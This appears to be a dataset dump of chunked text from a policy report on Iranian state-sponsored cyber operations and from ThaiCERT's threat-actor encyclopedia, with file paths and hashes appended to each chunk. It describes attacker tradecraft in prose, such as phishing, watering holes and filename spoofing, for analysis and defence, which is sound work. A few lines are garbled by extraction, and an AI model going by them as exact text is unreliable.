While Iran’s offensive cyber operations have required modest resources to develop, they have allowed Tehran to project itself as an emerging cyber power able to cause significant harm to its adversaries. The country’s security establishment has used these resources to signal to domestic and international audiences its ability to confront political subversion and retaliate against attacks on its infrastructure. These actions have brought international attention to Iran as a considerable force, perhaps beyond its actual capabilities, but have been ambiguous enough to allow Tehran to portray itself as a victim of the coercive measures of foreign states. As judged from evidence of coordination between security agency actions and observed cyber operations, the campaigns of Iranian threat actors almost certainly have a direct relationship with government entities, specifically the Islamic Revolutionary Guard Corps and the Ministry of Intelligence. Given this alignment and collaboration, Iranian threat actors are described here as state-sponsored. However, since the threat actors are commonly private contractors in small security companies, these relationships are sometimes nebulous and the operators are not integrated into the state’s forces.134 Iranian cyber operations often reflect law enforcement behavior normalized by other countries in response to advancing information technologies, such as the hacking of devices to wiretap encrypted internet communications.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|9392f8486dec41cc846e1e0465207e53

tries encounter. These interests are expressed frequently in campaigns, which include the documentation of persistent targeting of militant organizations—both domestic and regional—that are hostile to the Iranian government, including Baluchi separatists and the Islamic State. With the exception of Saudi Arabia, Iran appears to have had little success in compromising hardened government institutions or well protected organizations. After two decades of cyber crime, governments and private corporations have developed security policies and maintain collaborative relationships with external security organizations (for example, computer emergency readiness teams, or CERTs) that allow them to defend against attacks. In the office environment, companies can provide dedicated technical resources, exercise centralized control over devices, offer user education, and install protective network equipment that reduces risk. Such resources enable the private sector and governments to respond to threats and improve awareness collectively as a community.

The FBI has produced industry notifications on Iranian intrusion activities based on reports sourced from the private sector, and U.S. government entities have identified Iranian malware through information supplied from threat intelligence companies. When multiple computers in the Voice of America’s Persian service were infected by Iranian malware named Infy, the agent’s origin was identified by network administrators through a private report generated by a threat intelligence company that was made available to the agency.135 Such resources are not readily available to individuals—especially those residing in Iran—who find themselves alone and unprepared when targeted by even the most unsophisticated threat actors. While American banks quickly invested in countermeasures that limited the effectiveness of subsequent DDoS attempts in Operation Ababil, Persian-language social media platforms and media organizations subject to the same attacks commonly turned off services rather than pay thousands of dollars in bandwidth costs.136 One FBI notice sent to the private sector even documented fictitious profiles that were also used to target the Baha’i community.137 However, the FBI and cybersecurity companies do not commonly notify at-risk communities of threats to their safety and privacy. This divergence and exclusion represents the differences in opportunities afforded to nongovernmental and noncorporate targets of state-aligned threat actors.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|5f042eac69744d518d8b6846cf2e2c29

information security education programs have been developed through foreign assistance to cater to at-risk audiences, teaching concepts such as password management and how to recognize social engineering. Widely available account features such as two-factor authentication, which requires a user to provide a code sent through text message or an application to log into accounts, have demonstrably made it more difficult for Iranians to conduct credential theft. Private companies, such as Google and Cloudflare, as well as government funders, have supported DDoS-mitigation services that provide civil society organizations with enterprise-level defense resources to protect against such attacks at no cost, leading to a marked decrease in their frequency. As a result, a well-educated user with two-factor authentication and an iOS device is a more difficult target for Iranian threat actors to compromise. However, while technological options for protecting accounts and devices have improved in recent years, in the end the biggest vulnerability remains the user. Attempts to forecast the future of Iranian cyber operations are constrained by the secrecy on the part of the Iranian state about its activities and an uncertain geopolitical climate. Like most countries, Tehran does not appear to have a clear doctrine as to when it will engage in disruptive operations and retaliate in cyberspace. Nor is it likely to."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|b87025f2543349eebeeb13455b6f2a49
In line with its asymmetric strategies in traditional warfare, Tehran has often benefited from ambiguity. This may explain why it denies operations attributed to it, as well as why it did not immediately incorporate threat actors into the military apparatus. Having been the target of sustained cyber espionage and destructive attacks, Iran is bound to seek the same capabilities used against it. These capabilities provide Tehran opportunities to impose costs during potential hostilities. While Iran may not appear able to perform synchronized multistage attacks wherever it would like, Having been the target of it can repeatedly hammer away at soft targets in camsustained cyber espionage paigns of attribution.

"Under current perceptions of Iranian offensive cyber capabilities, it is unclear that it would be prepared and able to launch attacks against the power grid or industrial control systems, such as those conducted against Ukraine.138 Instead, attacks would follow the path of least resistance—targeting state and local governments rather than federal infrastructure, or unprepared sectors that have not been previously targeted such as transportation and logistics rather than the financial services.

Iranian to meddle with a local New York dam and other reports about the compromise of state agencies are demonstrative of the abundance of opportunities for Iran to retaliate against the United States.139 Moreover, although Iran has been described as a rational actor, it is not unitary, as the overlapping operations and intragovernmental surveillance conducted by the Ministry of Intelligence and IRGC demonstrate.140 The motivations, coordination, and authorization of Iranian state-aligned campaigns may differ from the policy position of other branches of government, and the use of offensive cyber capabilities is less visible to observers than the mobilization of troops. Iran’s security apparatus can easily conduct hostilities in cyberspace without the consent or awareness of the rest of the government. Disruptive activities conducted by Iranian threat actors have decreased overall since the interim nuclear deal signed in November 2013—known as the Joint Plan of Action framework. The rhetoric of government and military officials has also evolved over time. In recent years, particularly under the Rouhani administration, fewer blusterous statements have been made regarding Iran’s cyber operations.141 While Tehran is less likely to engage in disruption of American or European infrastructure amid current circumstances, it has engaged in cyber espionage and will continue to do so."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|9a4d0230f1d44c54ab0b78b5b906b8dc
The perceived success of previous campaigns has solidified the principle of offensive cyber operations as an effective means for Iran to continue to conduct espionage and surveillance against regional adversaries and political opponents. Yet Iran will continue to be limited by resource constraints for the foreseeable future. Tehran has rarely appeared able to conduct large-scale exfiltration of classified business and government data, differing, for example, from Chinese efforts to steal Boeing’s industrial secrets or extensive databases from the U.S. Office of Personnel Management.142 What’s more, the threshold of difficulty for compromising such targets will increase over time, and it is unclear whether Iranian capabilities will improve proportionally. Iran’s massive brain drain, with many of its brightest engineers leaving for political and economic reasons, imposes further constraints on the development of its cyber capabilities. Iran’s minister of science, research and technology estimated that 150,000 highly talented people emigrate from Iran every year, a $150 billion annual economic loss.143 When Iranian engineers leave for Silicon Valley and Europe, the country’s capacity for effective offensive and defensive cyber operations goes with them. In the absence of a historical comparison of Iranian cyber operations, new incidents or the rise of new groups is often incorrectly perceived as a dramatic improvement to capacity.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|f8c1a6190b424b60acfa915e064bc9bd

IRAN’S CYBER THREAT

Attempts by the government, universities, and the private sector to create a professional cybersecurity community, such as hosting Capture the Flag tournaments, will inevitably result in a deeper talent pool. Observing other nation-state actors provides a set of benchmarks that can be a reliable indicator of improvement or change in posture, including: •

coordination of threat actors, more consistent improvement to domestically produced malware, and the development of purpose-built tools that could suggest the consolidation of capability, specialization of personnel, and even incorporation into the state;

investments in operational security, ranging from reducing the exposure of information on operators to increased investment in concealment (such as Magic Kitten’s relay network);

improvements in background research and foreign language abilities within operations, such as more personalization of social engineering attempts, that would reflect the inclusion of nontechnical support staff; and

execution of operations that include zero-day exploits or target core infrastructure (for example, compromising network devices, routing protocol hijacks, and telecommunications signaling manipulation), suggesting more investment in resources for systemic cyber operations."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|ce76e50df2ef41dc8006cd772d2b5b6b
Despite Iran’s current lack of technical sophistication, simple means can still be effective at imposing political and economic costs, as evidenced by Russia’s successful compromise and subsequent leaking of the internal communications of Democratic Party institutions and operatives before the 2016 U.S. election. Some of the most damaging materials used in the operation came via a simple breach of a Gmail account, an opportunity available to anyone. This also reinforces the challenge of discerning intent—what initially appears as espionage can later turn into an attack.144 Given Iran’s dispersed ecosystem of threat actors, deterring Tehran from engaging in offensive cyber operations is as challenging as other efforts to address security issues involving the country. Cyber activities are less likely to lead to regional destabilization than are offline Iranian threats, and historically, Tehran’s disruptive attacks against nonIranian targets have been retaliation during hostilities rather than instigation toward new conflicts. To maintain credibility at a time when Western surveillance activities are publicly exposed through leaked confidential documents, effective policy responses need to differentiate espionage or signaling from sabotage or the infringement of human rights, actions that violate international norms. It is also important to recognize that Iranian offensive cyber operations do not require technology transfers or the support of other states.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|980a3a6dc0fa4a0cab29bd99e229d178

working within a small number of companies—will continue to be tough to identify, prosecute, and punish. Naming and shaming may chill participation in state-aligned operations, especially among talented individuals looking to travel outside the country or study abroad. However, it is unclear whether those publicly identified with Operation Ababil or other campaigns have changed their involvement after being outed. Moreover, the loosely connected and small groups are not cost-effective targets for retaliatory cyber operations. In the end, Iran maintains a large enough pool of sufficiently capable programmers to conduct basic campaigns. Therefore, while exposing Iranian cyber operations and operators may degrade and delay the development of better cyber capabilities, it will not fully deter Iran."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|cc5eb26a2fd64ca8a0699f1cdc31be93
"POLICY APPROACHES TO IRAN’S CYBER THREAT This leaves a select number of policy options, primarily (1) utilizing existing frameworks for targeted sanctions or indictments, (2) improving information sharing on threats across communities, and (3) supporting initiatives to improve information security. The comprehensive sanctions regime against Iran is unlikely to substantially interfere with its development of offensive cyber capabilities. Iranians commonly use servers outside the country, typically hosted on networks in Europe and Russia that provide service to other cyber crime networks (bulletproof hosting) or registered using false information.145 Since the resources necessary to improve capacity are organizational and professional development rather than computers or infrastructure, there are few technological items or The U.S. Treasury services that could potentially be deterred.

cyber operations against American infrastructure (Executive Order 13694).147 Sanctions and other financial mechanisms could be used to deter foreign countries or other actors from providing support to Iranian offensive cyber operations. Executive Order 13606 offers an example in its authority to designate any entity, whether in Iran or elsewhere, that has facilitated the Iranian government in its “computer and network disruption, monitoring, and tracking.” While the order focuses on human rights, similar language could focus on Tehran’s attacks against critical infrastructure and espionage. The narrowly tailored extension of these authorities could help ensure that Iran’s cyber operations do not benefit from technology transfers or foreign assistance as Tehran expands its security and commercial ties, especially to countries such as Russia and China. Additionally, the Justice Department has issued indictments against Iranians implicated in disruptive campaigns (the same individuals allegedly responsible for Operation Ababil were also designated under Executive Order 13694) and has successfully obtained the extradition from a third country of a hacker involved in the theft of military secrets.148 Because of the small operational footprint of the groups, targeted sanctions or legal proceedings are more symbolic than disruptive, but few other opportunities exist to impose consequences on individuals who participate in operations.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|8b17144bcb624624869806bdd20cc6fc
Given the level of rudimentary nature of its cyber operations, a purely political or legal response that is focused solely on deterring Iran would be ineffective toward addressing national cybersecurity risks. Any system that can be breached by Iranian groups is equally susceptible to others with similar sets of motivations, notably North Korea and Hamas. An effective policy response to the threats posed by Iran must focus on securing critical infrastructure overall. Information sharing has been one of the most common strategies pursued by the United States, Europe, and the private sector to reduce the effectiveness of Iranian cyber operations. After the Aramco attack, the United States used its superiority in monitoring and attributing Iranian activities to strengthen intelligence relationships with its Arab allies in the Persian Gulf.149 This is an immensely valuable resource that should be extended where possible, and further support can be provided to regional allies. Similarly, the FBI has provided notifications to and facilitated information sharing with the private sector on specific Iranian campaigns. These efforts can be expanded to include more partners and to provide data to civil society organizations. Unlike traditional security issues, private individuals are more exposed to cyber operations owing to the transnational and virtual nature of threats.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|871a59ae96374459bc524a11c7de1625

Facebook and Google, have played a positive role in providing the tools to help individuals defend against attacks—even going so far as notifying users when they have been targeted by state-aligned campaigns, including those from Iran. These initiatives raise the bar for attackers and should be seen within tech companies as a core obligation of keeping at-risk users safe. Discussions about securing dissidents would be incomplete without highlighting the pioneering role of the United States government and European development agencies in providing secure communications tools to activists—often referred to as the Internet Freedom agenda. Government funding has provided early stage investment for researchers and developers to produce prototypes and deployable products to protect activists and civil society that would not be the focus of the private sector. A significant proportion, if not majority, of Iranians that bypass the censorship regime do so using safe and reliable tools funded by the State Department and Broadcasting Board of Governors. Both have also supported the development of encryption tools such as Signal that have even been adopted by tech companies within their own messaging applications, demonstrating the importance of Internet Freedom as a public-private cooperation."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|3741c34830044795bf94d96bf41401e0
The United States and European Union should continue to promote programs and norms on internet access and cybersecurity that prioritize the free and secure flow of information against challenges from countries such as Iran, China, and Russia. Aside from funding for civil society, this includes promotion of democratic values within internet governance frameworks, such as the Internet Corporation for Assigned Names and Numbers (ICANN) and the International Telecommunications Union (ITU). This also highlights the importance of domestic policy on Internet Freedom efforts: proposals to weaken information security products such as encrypted messaging applications would harm individuals in countries where rule of law is weak and backdoor access in communications networks is commonly repurposed for repression. As the history of Iranian offensive cyber operations demonstrates, the same actors responsible for espionage against the private sector engage in surveillance of human rights defenders, and with considerably more success, owing to the targets’ resource constraints. These at-risk communities provide a canary for the tactics and tools that will be employed against other targets, and increased information exchange will enable more effective education and mitigation strategies for all. Policymakers have long understood that the changes that will lead Iran to be a productive member of the international community will come from within.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|6c92aab9476342cc95ac38f8e7d43de9

Schmitt, “Cyber Operations and the Jus Ad Bellum Revisited.” 35 Tim Maurer, Cyber Mercenaries: The State, Hackers, and Power (Cambridge: Cambridge University Press, 2018). 36 Ibid. 37 The tools and resources developed by Tehran have been almost uniformly described by outside investigators as unsophisticated, particularly in comparison with malware produced by other state and nonstate actors. The information security company Mandiant affirmed this observation in a 2014 report: “Mandiant’s observations of suspected Iranian actors have not provided any indication that they possess the range of tools or capabilities that are hallmarks of a capable, full-scope cyber actor."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|d78209c3d2f745f799e9433f223d6bcb
They rely on publicly available tools and capitalize solely on Web-based vulnerabilities—constraints that suggest these cyber actors have relatively limited capabilities.” See: Mandiant, “M-Trends 2014 Annual Threat Report: Beyond the Breach by Mandiant, a FireEye Company,” accessed December 5, 2017, https:// www2.fireeye.com/fireeye-mandiant-m-trends-report. 38 For example, former representative Peter Hoekstra speculated at a U.S. House hearing that Iran’s advances in cyberwarfare came from the “cooperation they have with Russia.” Other former and current officials have commented, often on background, that Russia was a potential partner in warfare. For the subcommittee hearing on Iran’s support terrorism worldwide, see the following: “Iran’s Support for Terrorism Worldwide,” Foreign Affairs Committee, March 4, 2014, https://foreignaffairs.house.gov/ hearing/joint-subcommittee-hearing-irans-support-for-terrorism-worldwide/. Elsewhere, claims have been made by lesser known cybersecurity companies, but these analyses have been flawed and not well accepted. For more on these flawed analyses, see: Collin Anderson, “Bears and Kittens, and Startup Cybersecurity Companies,” Medium, May 18, 2017, https://medium.com/@collina/bears-and-kittensand-startup-cybersecurity-companies-5c8e037ea75c.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|9daafd286b0445bebc84ffae072bd24a

The former appears more likely. 41 Rocket Kitten and Flying Kitten are examples of how the line demarcating intrusion groups is not always clear. The structural similarities of certain intrusion tools and the reuse of lesser known infrastructure indicate that parts of Flying Kitten and Rocket Kitten may have had a common heritage, including common members and shared tools; see: Collin Anderson, “Flying Kitten to Rocket Kitten, A Case of Ambiguity and Shared Code,” Iran Threats, December 5, 2017, https://iranthreats.github.io/ resources/attribution-flying-rocket-kitten/.

Based on a Freedom of Information Act request by the authors to the Broadcasting Board of Governors on cybersecurity incidents related to Iran, which returned details of the attack, involving compromising the VOA’s account through impersonation with falsified documents sent through a fax.

However, within observations of activity, there does appear to be a clustering of victims, with some samples of the malware agent specifically used to compromise Lebanese and Qatari victims, but not Iranians or other targets of exclusive interest to Iran. 54 Members of the infamous Ashiyane hacking community and others commonly broke into Arabic media and U.S. government sites with political messages, such as protesting alternative names for the Persian Gulf, Western perceptions of Islam, nuclear rights, the administration of George W. Bush, and the crimes of other countries—often in broken English and always bearing attribution. In a few cases these campaigns were sustained over longer periods of time and were intended to make a point, especially when it came to Israeli and Saudi targets. “Al Khaleej Newspaper Website Hacked,” Gulf News, March 7, 2017, http://gulfnews.com/news/uae/general/al-khaleej-newspaper-website-hacked-1.106195; Zone-H mirror page, “fdfhome.gsfc.nasa.gov hacked.

Mohammed Saeed Ajily and Mohammed Reza Rezakhah, unsealed July 17, 2017, https://www.justice.gov/opa/press-release/file/982106/download. For those on the ground the threats posed are more complex and multifaceted. For example, Iranian telecommunications firms appear to have cooperated with the government in order to provide access to the recovery and two-factor authentication codes sent by text. These then allowed access to Google, Telegram, and other accounts on foreign platforms. The most significant counterevidence of state-alignment is that when the Infy group was disclosed by Palo Alto in May 2016, the domains used in the communications of the malware were filtered by the censorship apparatus, blocking access to those victims. There are explanations for this action that would not conflict with the theory that Infy was acting on behalf of the government, including that the censorship was intended to hide evidence of the operation from the Iranian public. Specifically, we observed direct interactions between the Iranian state and the groups Charming Kitten, Flying Kitten, Magic Kitten, and Rocket Kitten. More tenuous links exist for Infy based on this criteria. “Rocket Kitten: A Campaign With 9 Lives,” Check Point Software Technologies Ltd., November 9, 2015,|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|1c58a1cc955a49a8b395ff49b6e13c35

Iranian security and intelligence agencies have however frequently used blackmail and humiliation to intimidate or coerce individuals, including BBC Persian journalists. It is possible that material compromised through intrusions has been used for political manipulation, as this would be difficult to observe without acknowledgement from the victim.

As a result of its use of encryption, it is not susceptible to the filtering of specific content or keywords. While both Iranian authorities and Telegram have never been fully forthcoming about their relationship, it is clear that the former has attempted to incentivize and threaten Telegram into complying with requests for the removal of content—including briefly blocking the service in October 2015. While it appears that Telegram does take down pro–Islamic State content, it has not thus far complied with other requests. 107 Collin Anderson, “How Iran Is Building Its Censorship-Friendly Domestic Internet,” Backchannel (blog), Wired, September 23, 2016, backchannel.com/how-iran-is-building-its-censorship-friendlydomestic-internet-11db69aae96d."|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|9c75f9af1b774daebd60b42e9b868200

Regardless of the legitimacy of these claims, the attempts against Fereydoun began early in Rouhani’s first term and targeted his family. This extended into impersonating Zarif to target Fereydoun and vice versa.

128 FireEye (through its iSIGHT Partners) has also noted that threat actors focused on the Islamic State as the militant group was expanding its territory across Iraq, an interest expressed by the threat actors well before 2015. David E. Sanger and Nicole Perlroth, “Iranian Hackers Attack State Dept. via Social Media Accounts,” New York Times, November 24, 2015, http://www.nytimes.com/2015/11/25/world/ middleeast/iran-hackers-cyberespionage-state-department-social-media.html. 129 In one case a shared computer in Erbil, Iraq, used by a Kurdish supporter of a Jordanian jihadi figure was compromised through the malware, which was delivered as personal pictures sent by a fictitious female social network profile. The same group maintained phishing sites with hard-coded references to Facebook pages associated with the Islamic State’s “Ministry of Information,” Tunisian Islamic Awakening, Lashkar-e-Khorasan (Pakistan), and al-Qaeda affiliates, among other Islamist movements. This targeting was broad, but more effort was spent on Persian-language or Iran-oriented actors, targeting Facebook pages as small as one with five members and one public post, a “Salafe Kurdistan” page. 130 The operations reflect old rivalries from the Islamic Revolution being played out, as Flying Kitten sought access to accounts and sites associated with Marxist-Leninist Fedaian and other Communist parties as well.|data_input/Oilrig_reports/entry_8cf31851-ebb3-4479-b5a8-9804ef8f9baa.text|ecb8948877bd4f209d573a65688d3b3a
"131 Some of the first observed operations of the Infy group targeted Taftaan News Agency and the Jonbesh­e Moqavemat­e Mardomi­e Iran separatist group, and compromised computers in the province of Sistan and Balochistan over the course of several years. Shortly after the suspected time of intrusion, at least one of the affected blogs warned its visitors that an old email address connected to the site had been compromised by Iranian intelligence agencies. The following day the administrators closed the site, claiming technical issues. 132 Several Infy malware samples had names such as “pjak.pps” and other references to Marxist ideologies (such as “kargar.pps,” or “worker”). 133 For example, current and former employees of the organization, both with the Iran Program and general operations staff, have been engaged by several fictitious personas on LinkedIn and Facebook, including the persona “Victoria Roberts,” the LinkedIn profile name described earlier as connecting predominantly with defense companies. The existing networks of these profiles reflect a specific interest in the American foreign policy establishment, international development programs, and the defense industrial base.

134 Healey defines “state-integrated” as the “national government integrates third-party attackers and government cyber forces, with common command and control.” This still allows for informal coordination with external parties so long as the government remains in control. While Iranian threat actors receive tasking from the government, there is little indication that any of them are formal members of the security forces. 135 Based on a Freedom of Information Act request by the authors to the Broadcasting Board of Governors on cybersecurity incidents related to Iran. 136 David M.

While iSIGHT Partners identified fourteen accounts of American or European background, the FBI provided a list of fifty-six unique personas, of which fifteen had family names that appeared to be Persian and had not been identified in the previous report.

Threat Group Cards: A Threat Actor Encyclopedia

Introduction When analyzing security incidents we always face the question which adversary we are possibly dealing with and what we know about their prior engagements and TTP, to get a better understanding of how to approach and what else to look for. This document aims to create full profiles of all threat groups worldwide that have been identified with all research generously shared by anti-virus and security research organizations over the years. It can be used as “threat group cards”, as the document title suggests, to have everything together in an elaborate profile for each threat group. All dates shown in the cards are the dates when the stated activities started, not necessarily when the reports about them came out. All information in this document comes from public sources (OSINT). The difficult part of attributing campaigns to actors has been done by those security research organizations as well. What makes this difficult is the fact that there may be some overlap between threat groups, where they share tools or people move between groups, or when groups suddenly change tactics or type of target. Not all groups have been publicly documented as well as others; most groups have remained rather obscure and, of course, not all individual campaigns resulted in public knowledge – targeted companies usually don’t welcome such exposure."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|75f16a2230204170978474d0be206a0c
As a National CERT, ThaiCERT has a strictly neutral role and everything collected in this document does in no way signify specific endorsements, placing blame on countries or taking sides. With that said, compiling this document has been a tremendously interesting journey into the dark world of cybercrime and the groups associated with it. Note: Users of the MISP can also use the MISP Threat Actor cluster (galaxy) located at <https://github.com/MISP/misp-galaxy/blob/master/clusters/threat-actor.json>|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|3b46c6ee60544a95b582e4c7ef4aab8a
"Approach In order to obtain an initial set of actors, we perused the public archives from MISP, MITRE and the volunteer overview on Google Docs (resource 1-3 in the APPENDIX: Sources Used). Generally, those, as well as media reports about threats, tend to lump everything together as aliases or synonyms – be it actual group names as tracked by research organizations, alleged (state) sponsor names, individual campaigns run by the group or specific pieces of malware used by the group. In this report, aliases are only listed as such if we could realistically determine it to be a fact, generally because we found which organization gave it that name. Everything else known about each actor has been split off into the relevant fields (sponsors, operations, tools). The next step was to search our Risk Intelligence archive and after that, using our favorite Internet search engine for any public news about each and every actor to find all their campaigns and other activities that have been discovered. Analysis of those (thousands of) reports created the total overview of all tools used and where this actor has been observed in terms of countries and sectors. Lastly, we went over the entire rich archive known as Malpedia to augment the set with malware names that had not appeared in the reports we saw. In each step we took great care to make sure only Open Source Intelligence appeared in this document.

Advanced Persistent Threat (APT) Groups Cybereason provides the following definition of an Advanced Persistent Threat:

An advanced persistent threat is a stealthy cyberattack in which a person or group gains unauthorized access to a network and remains undetected for an extended period. The term's definition was traditionally associated with nation-state sponsorship, but over the last few years we’ve seen multiple examples of non-nation state groups conducting large-scale targeted intrusions for specific goals."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|bc1117265b5543e6b3258ac5429bb211
"Apart from all the APT groups profiled in this chapter, there are of course others, but no public information is available about them. Especially CrowdStrike has been very active in researching APT groups and mentioned the following names in passing, in summary reports: Big Panda, Foxy Panda, Hammer Panda, Impersonating Panda, Judgement Panda, Karma Panda, Keyhole Panda, Kryptonite Panda, Maverick Panda, Nomad Panda, Poisonous Panda, Predator Panda, Toxic Panda, Union Panda, Wet Panda, Corsair Jackal and Ghost Jackal.

Motivation

Information theft and espionage

Description

(Dragos) Allanite accesses business and industrial control (ICS) networks, conducts reconnaissance, and gathers intelligence in United States and United Kingdom electric utility sectors. Dragos assesses with moderate confidence that Allanite operators continue to maintain ICS network access to: (1) understand the operational environment necessary to develop disruptive capabilities, (2) have ready access from which to disrupt electric utilities. Allanite uses email phishing campaigns and compromised websites called watering holes to steal credentials and gain access to target networks, including collecting and distributing screenshots of industrial control systems. Allanite operations limit themselves to information gathering and have not demonstrated any disruptive or damaging capabilities. Allanite conducts malware-less operations primarily leveraging legitimate and available tools in the Windows operating system."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|5d65997facc445a48ffc5e74c8cda004

Description

(FireEye) We have observed one APT group, which we call APT5, particularly focused on telecommunications and technology companies. More than half of the organizations we have observed being targeted or breached by APT5 operate in these sectors. Several times, APT5 has targeted organizations and personnel based in Southeast Asia. APT5 has been active since at least 2007. It appears to be a large threat group that consists of several subgroups, often with distinct tactics and infrastructure. APT5 has targeted or breached organizations across multiple industries, but its focus appears to be on telecommunications and technology companies, especially information about satellite communications. APT5 targeted the network of an electronics firm that sells products for both industrial and military applications. The group subsequently stole communications related to the firm’s business relationship with a national military, including inventories and memoranda about specific products they provided. In one case in late 2014, APT5 breached the network of an international telecommunications company. The group used malware with keylogging capabilities to monitor the computer of an executive who manages the company’s relationships with other telecommunications companies

Description

(Kaspersky) The FBI issued a rare bulletin admitting that a group named Advanced Persistent Threat 6 (APT6) hacked into US government computer systems as far back as 2011 and for years stole sensitive data. The FBI alert was issued in February and went largely unnoticed. Nearly a month later, security experts are now shining a bright light on the alert and the mysterious group behind the attack. “This is a rare alert and a little late, but one that is welcomed by all security vendors as it offers a chance to mitigate their customers and also collaborate further in what appears to be an ongoing FBI investigation,” said Deepen Desai, director of security research at the security firm Zscaler in an email to Threatpost. Details regarding the actual attack and what government systems were infected are scant. Government officials said they knew the initial attack occurred in 2011, but are unaware of who specifically is behind the attacks. “Given the nature of malware payload involved and the duration of this compromise being unnoticed – the scope of lateral movement inside the compromised network is very high possibly exposing all the critical systems,” Deepen said.

Description

(CrowdStrike) Numbered Panda has a long list of high-profile victims and is known by a number of names including: DYNCALC, IXESHE, JOY RAT, APT-12, etc. Numbered Panda has targeted a variety of victims including but not limited to media outlets, high-tech companies, and multiple governments. Numbered Panda has targeted organizations in time-sensitive operations such as the Fukushima Reactor Incident of 2011, likely filling intelligence gaps in the ground cleanup/mitigation operations. Screen saver files, which are binary executables and PDF documents, are common Numbered Panda weaponization tactics. One of the most interesting techniques that Numbered Panda likes to use is to dynamically calculate the Command and Control (C2) port by resolving a DNS. This effectively helps Numbered Panda bypass egress filtering implemented to prevent unauthorized communications on some enterprises. The malware will typically use two DNS names for communication: one is used for command and control; the other is used with an algorithm to calculate the port to communicate to.

“ETUMBOT” campaign Target: Taiwan Once the malicious file was downloaded and extracted by the victim, Etumbot uses a right-to-left override exploit to trick the victim to download the malware installer. According to Arbor Security, the “technique is a simple way for malware writers to disguise names of malicious files. A hidden Unicode character in the filename will reverse the order of the characters that follow it, so that a .scr binary file appears to be a .xls document, for example.”

Description

(Palo Alto) We’ve uncovered some new data and likely attribution regarding a series of APT watering hole attacks this past summer. Watering hole attacks are an increasingly popular component of APT campaigns, as many people are more aware of spear phishing and are less likely to open documents or click on links in unsolicited emails. Watering hole attacks offer a much better chance of success because they involve compromising legitimate websites and installing malware intended to compromise website visitors. These are often popular websites frequented by people who work in specific industries or have political sympathies to which the actors want to gain access. In contrast to many other APT campaigns, which tend to rely heavily on spear phishing to gain victims, “th3bug” is known for compromising legitimate websites their intended visitors are likely to frequent. Over the summer they compromised several sites, including a well-known Uyghur website written in that native language.

Description

(F-Secure) The Dukes are a well-resourced, highly dedicated and organized cyberespionage group that we believe has been working for the Russian Federation since at least 2008 to collect intelligence in support of foreign and security policy decision-making. The Dukes primarily target Western governments and related organizations, such as government ministries and agencies, political think tanks, and governmental subcontractors. Their targets have also included the governments of members of the Commonwealth of Independent States; Asian, African, and Middle Eastern governments; organizations associated with Chechen extremism; and Russian speakers engaged in the illicit trade of controlled substances and drugs. The Dukes are known to employ a vast arsenal of malware toolsets, which we identify as MiniDuke, CosmicDuke, OnionDuke, CozyDuke, CloudDuke, SeaDuke, HammerDuke, PinchDuke, and GeminiDuke. In recent years, the Dukes have engaged in apparently biannual large-scale spear-phishing campaigns against hundreds or even thousands of recipients associated with governmental institutions and affiliated organizations. These campaigns utilize a smash-and-grab approach involving a fast but noisy break-in followed by the rapid collection and exfiltration of as much data as possible."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|285540120ff94569bcfc2884a214cb01
"If the compromised target is discovered to be of value, the Dukes will quickly switch the toolset used and move to using stealthier tactics focused on persistent compromise and long-term intelligence gathering. In addition to these large-scale campaigns, the Dukes continuously and concurrently engage in smaller, much more targeted campaigns, utilizing different toolsets. These targeted campaigns have been going on for at least 7 years. The targets and timing of these campaigns appear to align with the known foreign and security policy interests of the Russian Federation at those times.

The most unusual is the targeting of individuals that appear to be involved in the traffic and reselling of controlled and illegal substances, such as steroids and hormones. These victims in the NITRO project have been observed only in Russia. <https://securelist.com/miniduke-is-back-nemesis-gemina-and-thebotgen-studio/64107/>

Operation “Office monkeys” In March 2014, a Washington, D.C.-based private research institute was found to have CozyDuke (Trojan.Cozer) on their network. Cozy Bear then started an email campaign attempting to lure victims into clicking on a flash video of office monkeys that would also include malicious executables. By July the group had compromised government networks and directed CozyDuke-infected systems to install MiniDuke onto a compromised network. <https://www.symantec.com/connect/blogs/forkmeiamfamousseaduke-latest-weapon-duke-armory>

"Description

